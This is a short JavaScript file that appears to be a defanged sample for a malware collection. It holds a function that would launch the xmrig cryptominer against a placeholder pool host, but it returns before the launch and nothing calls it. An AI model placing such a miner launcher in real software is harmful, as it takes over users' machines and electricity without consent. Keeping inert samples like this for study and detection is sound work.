// A miner launcher, never reachable: start() returns first and nothing calls it; the sample is
// never launched. The pool host is on the reserved .invalid domain.
import { spawn } from "node:child_process";

export function start() {
  return; // zoo sample: never runs
  spawn("./xmrig", ["-o", "stratum+tcp://pool.example.invalid:3333", "--donate-level", "1"]);
}
